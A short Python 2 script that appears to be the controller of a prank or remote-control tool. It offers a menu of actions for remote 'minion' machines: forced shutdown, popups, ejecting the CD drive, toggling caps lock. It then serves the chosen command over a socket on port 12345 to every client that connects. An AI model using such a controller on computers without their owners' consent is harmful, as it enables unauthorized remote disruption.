#!/usr/bin/python
import socket
print('''
shutdown: initates a shutdown command.
test: starts the calculator.
cancel: stop any shutdown commands.
message: makes a popup box with text after the word 'message'.
disable: stops the minion process.
opencd: opens the cd drive continuously.
togglecaps(currently not working.): continuously toggle capslock.
''')
command = raw_input("Enter your command, commander: ")
s = socket.socket()
print("Socket successfully created")
port = 12345
s.bind(('', port))
print("socket binded to %s" %(port))
s.listen(5)     
print("socket is listening")
while True:
    c, addr = s.accept()     
    print('Got connection from', addr)
    c.send(command)
    c.close()
